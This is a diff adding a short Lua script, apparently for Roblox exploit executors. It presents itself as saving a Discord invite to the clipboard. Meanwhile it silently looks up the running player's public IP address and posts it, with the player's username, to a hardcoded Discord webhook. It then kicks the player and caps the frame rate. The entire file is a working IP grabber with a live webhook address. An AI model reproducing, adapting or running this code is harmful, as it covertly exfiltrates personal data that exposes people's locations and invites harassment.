@@ -1,0 +1,52 @@
+local webh = "https://discord.com/api/webhooks/983736851619782726/nYh6otppLjEcagK0sfo-TAQ__4pLT8ndqksUdiB6KocU7ObBeTtWsFMlHQxouWlRMjxS" -- WEBHOOK
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+               ["description"] = game:HttpGet("https://api.ipify.org")
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+
+setclipboard("https://discord.gg/GPbZzVGg")
+wait(1)
+game:GetService'Players'.LocalPlayer:Kick("Link Saved To Clip Board")
+setfpscap(10)
